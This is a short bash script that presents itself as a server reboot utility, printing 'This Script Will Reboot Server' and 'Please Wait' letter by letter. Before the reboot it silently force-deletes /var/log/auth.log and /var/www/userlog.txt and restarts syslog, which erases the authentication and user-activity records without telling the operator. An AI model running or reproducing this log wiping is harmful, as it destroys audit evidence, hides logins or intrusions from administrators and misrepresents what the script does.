#!/bin/bash
printshahan() {
    text="$1"
    delay="$2"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep $delay
    done
    echo
}
clear
echo ""
printshahan "This Script Will Reboot Server" 0.1
echo ""
echo ""
printshahan "Please Wait . . ." 0.1
echo ""
echo ""

rm -fr /var/log/auth.log
rm -fr /var/www/userlog.txt
systemctl restart syslog
reboot
